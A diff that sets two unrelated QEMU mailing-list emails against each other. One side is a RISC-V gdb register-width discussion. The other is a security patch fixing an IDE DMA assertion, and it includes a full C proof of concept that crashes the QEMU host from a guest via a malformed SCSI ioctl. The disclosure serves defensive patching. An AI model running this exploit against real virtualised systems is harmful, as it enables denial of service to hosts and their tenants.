@@ -2,43 +2,59 @@ Return-Path: <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>
 X-Original-To: lists+qemu-devel@lfdr.de
 Delivered-To: lists+qemu-devel@lfdr.de
 Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
-	by mail.lfdr.de (Postfix) with ESMTPS id BA1BA60740
-	for <lists+qemu-devel@lfdr.de>; Fri,  5 Jul 2019 16:06:55 +0200 (CEST)
-Received: from localhost ([::1]:53512 helo=lists1p.gnu.org)
+	by mail.lfdr.de (Postfix) with ESMTPS id C41C66082B
+	for <lists+qemu-devel@lfdr.de>; Fri,  5 Jul 2019 16:44:50 +0200 (CEST)
+Received: from localhost ([::1]:53844 helo=lists1p.gnu.org)
 	by lists.gnu.org with esmtp (Exim 4.86_2)
 	(envelope-from <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>)
-	id 1hjOrV-0007UY-W1
-	for lists+qemu-devel@lfdr.de; Fri, 05 Jul 2019 10:06:54 -0400
-Received: from eggs.gnu.org ([2001:470:142:3::10]:45291)
+	id 1hjPSE-0006oi-1A
+	for lists+qemu-devel@lfdr.de; Fri, 05 Jul 2019 10:44:50 -0400
+Received: from eggs.gnu.org ([2001:470:142:3::10]:46200)
  by lists.gnu.org with esmtp (Exim 4.86_2)
- (envelope-from <georg.kotheimer@kernkonzept.com>) id 1hjOq7-0006Ua-M2
- for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:05:31 -0400
+ (envelope-from <a13xp0p0v88@gmail.com>) id 1hjOsr-0001A0-2R
+ for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:08:19 -0400
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
- (envelope-from <georg.kotheimer@kernkonzept.com>) id 1hjOq5-00034q-IC
- for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:05:26 -0400
-Received: from serv1.kernkonzept.com ([2a01:4f8:1c1c:b490::2]:52459
- helo=mx.kernkonzept.com)
- by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_256_CBC_SHA1:32)
- (Exim 4.71) (envelope-from <georg.kotheimer@kernkonzept.com>)
- id 1hjOq4-00019Q-CA; Fri, 05 Jul 2019 10:05:24 -0400
-Received: from [95.90.166.246] (helo=tweek.localnet)
- by mx.kernkonzept.com with esmtpsa (TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384:256)
- (Exim 4.89) id 1hjOpe-0003QJ-7W; Fri, 05 Jul 2019 16:04:58 +0200
-From: Georg Kotheimer <georg.kotheimer@kernkonzept.com>
-To: Richard Henderson <richard.henderson@linaro.org>, qemu-devel@nongnu.org
-Date: Fri, 05 Jul 2019 16:04:57 +0200
-Message-ID: <3120585.xbh9iPihlS@tweek>
-In-Reply-To: <345cc679-deac-ce52-664b-0ac5883671ca@linaro.org>
-References: <20190703142617.21073-1-georg.kotheimer@kernkonzept.com>
- <345cc679-deac-ce52-664b-0ac5883671ca@linaro.org>
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7Bit
-Content-Type: text/plain; charset="us-ascii"
-X-detected-operating-system: by eggs.gnu.org: Genre and OS details not
- recognized.
-X-Received-From: 2a01:4f8:1c1c:b490::2
-Subject: Re: [Qemu-devel] [PATCH] RISC-V: Select FPU gdb xml file based on
- the supported extensions
+ (envelope-from <a13xp0p0v88@gmail.com>) id 1hjOso-0006X0-8M
+ for qemu-devel@nongnu.org; Fri, 05 Jul 2019 10:08:15 -0400
+Received: from mail-lf1-f66.google.com ([209.85.167.66]:41390)
+ by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
+ (Exim 4.71) (envelope-from <a13xp0p0v88@gmail.com>)
+ id 1hjOsi-0005Yo-DH; Fri, 05 Jul 2019 10:08:09 -0400
+Received: by mail-lf1-f66.google.com with SMTP id 62so6422907lfa.8;
+ Fri, 05 Jul 2019 07:08:01 -0700 (PDT)
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=1e100.net; s=20161025;
+ h=x-gm-message-state:from:to:subject:date:message-id;
+ bh=isMJDTAnfZgWdLOw8d367N2Ss2BSvcqEi2CrNYGG5dM=;
+ b=ozJRLeWD3b2wGRC5EUhCGJyBwOCe6oxkGPVPu7z0C1ZUtWLNzPZEDS8rKRuax+fYxu
+ 3TnGQgPWaCErTFzcVCgNfBpCNDCNOHtTBHUzyg2hH0ASKfHPz1MV/BO+0Uli9/RzTggS
+ 9um4j4Y7sCpPg5eXBdj4xGlM9y7eifKRfzG7l6DeRj4vkfQBaMNnYhOvctV2f9B6eA4C
+ j8pK4+lLOxZ+xa1GhpjAXnbdLmjGW6UpHL1kVhYTDw0eHyk+LFZcuJuzlf37SywmGNZ6
+ WUyPuuUJEy+KQa48sUwWMB/pGLyBIlHTv6fvIl2rVJV21ni3kexjzCOHyV7cX6ycM6gX
+ 1/ew==
+X-Gm-Message-State: APjAAAVdlnj39vlc7yQUtWcCqzg5r0ULU/l95dhbW5PlS5AS2u1yqMVl
+ 6+UlV7ZHfXQna32ksFJ2pPM=
+X-Google-Smtp-Source: APXvYqx4GrlhQWRxzNKozoRLB24nQhBogFgYgJc9OPAkM0JAAayatoCnuq8RrJGKT9H8j+CQbCop4A==
+X-Received: by 2002:a19:ec15:: with SMTP id b21mr2311417lfa.32.1562335680324; 
+ Fri, 05 Jul 2019 07:08:00 -0700 (PDT)
+Received: from hobbit.lan (95-28-29-40.broadband.corbina.ru. [95.28.29.40])
+ by smtp.gmail.com with ESMTPSA id p21sm1098298lfc.41.2019.07.05.07.07.58
+ (version=TLS1_2 cipher=ECDHE-RSA-AES128-SHA bits=128/128);
+ Fri, 05 Jul 2019 07:07:59 -0700 (PDT)
+From: Alexander Popov <alex.popov@linux.com>
+To: John Snow <jsnow@redhat.com>, qemu-block@nongnu.org, qemu-devel@nongnu.org,
+ qemu-stable@nongnu.org, mst@redhat.com, pmatouse@redhat.com,
+ sstabellini@kernel.org, mdroth@linux.vnet.ibm.com, pjp@redhat.com,
+ alex.popov@linux.com
+Date: Fri,  5 Jul 2019 17:07:49 +0300
+Message-Id: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
+X-Mailer: git-send-email 2.7.4
+X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
+ [fuzzy]
+X-Received-From: 209.85.167.66
+X-Mailman-Approved-At: Fri, 05 Jul 2019 10:42:17 -0400
+Subject: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb() to
+ prevent qemu DoS from quest
 X-BeenThere: qemu-devel@nongnu.org
 X-Mailman-Version: 2.1.23
 Precedence: list
@@ -50,58 +66,91 @@ List-Post: <mailto:qemu-devel@nongnu.org>
 List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
 List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
  <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
-Cc: qemu-riscv@nongnu.org, Palmer Dabbelt <palmer@sifive.com>,
- Alistair Francis <alistair.francis@wdc.com>
 Errors-To: qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org
 Sender: "Qemu-devel" <qemu-devel-bounces+lists+qemu-devel=lfdr.de@nongnu.org>
 
-> While this appears reasonable, I wonder if RVF w/o RVD actually works?
->
-> Examining the two get/set functions, they always transfer 64 bits for the fpu
-> registers.
+This assertion was introduced in the commit a718978ed58a in July 2015.
+It implies that the size of successful DMA transfers handled in
+ide_dma_cb() should be multiple of 512 (the size of a sector).
 
-Wouldn't that implicate that FPU debugging has never been working properly on
-RV32, as prior to my changes the FPU registers on RV32 were always 32 bits
-wide? Nope, it does work (tested with a build not containing my changes), but
-for all the wrong reasons. The get/set functions should be modified so that
-they take the actual size of the floating point registers into account.
+But guest systems can initiate DMA transfers that don't fit this
+requirement. Let's improve the assertion to prevent qemu DoS from quests.
 
+PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
+command and crash qemu:
 
-> In addition, there's a suspicious use of sizeof(target_ulong) when transferring
-> the fpu related csr registers, which definitely shouldn't work with the shared
-> files above.  If the xml file is correct, this should always be uint32_t.
+#include <stdio.h>
+#include <sys/ioctl.h>
+#include <stdint.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+#include <scsi/scsi.h>
+#include <scsi/scsi_ioctl.h>
 
-Good catch. According to the RISC-V ISA specification the fcsr is always 32
-bit wide.
+#define CMD_SIZE 2048
 
-I did a little bit of investigation and found the following contradiction in
-the gdb xml files. The registers fflags/frm/fcsr are listed in general csr
-file as well as in the fpu file. For RV64 the bitsize of the two definitions
-differs.
+struct scsi_ioctl_cmd_6 {
+	unsigned int inlen;
+	unsigned int outlen;
+	unsigned char cmd[6];
+	unsigned char data[];
+};
 
-gdb-xml/riscv-32bit-csr.xml:
-   <reg name="fflags" bitsize="32"/>
-   <reg name="frm" bitsize="32"/>
-   <reg name="fcsr" bitsize="32"/>
+int main(void)
+{
+	intptr_t fd = 0;
+	struct scsi_ioctl_cmd_6 *cmd = NULL;
 
-gdb-xml/riscv-64bit-csr.xml:
-   <reg name="fflags" bitsize="64"/>
-   <reg name="frm" bitsize="64"/>
-   <reg name="fcsr" bitsize="64"/>
+	cmd = malloc(CMD_SIZE);
+	if (!cmd) {
+		perror("[-] malloc");
+		return 1;
+	}
 
-gdb-xml/riscv-fpu-f.xml: (former riscv-32bit-fpu.xml)
-   <reg name="fflags" bitsize="32" type="int" regnum="66"/>
-   <reg name="frm" bitsize="32" type="int" regnum="67"/>
-   <reg name="fcsr" bitsize="32" type="int" regnum="68"/>
+	memset(cmd, 0, CMD_SIZE);
+	cmd->inlen = 1337;
+	cmd->cmd[0] = READ_6;
 
-gdb-xml/riscv-fpu-d.xml: (former riscv-64bit-fpu.xml)
-   <reg name="fflags" bitsize="32" type="int" regnum="66"/>
-   <reg name="frm" bitsize="32" type="int" regnum="67"/>
-   <reg name="fcsr" bitsize="32" type="int" regnum="68"/>
+	fd = open("/dev/sg0", O_RDONLY);
+	if (fd == -1) {
+		perror("[-] opening sg");
+		return 1;
+	}
 
-I don't know if this is on purpose, but my guess would be that fflags/frm/fcsr
-don't belong into riscv-32/64bit-csr.xml, and the bitsize should be 32
-regardless of the architecture's bitness.
+	printf("[+] sg0 is opened\n");
 
+	printf("[.] qemu should break here:\n");
+	fflush(stdout);
+	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
+	printf("[-] qemu didn't break\n");
+
+	free(cmd);
+
+	return 1;
+}
+
+Signed-off-by: Alexander Popov <alex.popov@linux.com>
+---
+ hw/ide/core.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+diff --git a/hw/ide/core.c b/hw/ide/core.c
+index 6afadf8..304fe69 100644
+--- a/hw/ide/core.c
++++ b/hw/ide/core.c
+@@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
+ 
+     sector_num = ide_get_sector(s);
+     if (n > 0) {
+-        assert(n * 512 == s->sg.size);
++        assert(n == s->sg.size / 512);
+         dma_buf_commit(s, s->sg.size);
+         sector_num += n;
+         ide_set_sector(s, sector_num);
+-- 
+2.7.4
 
 
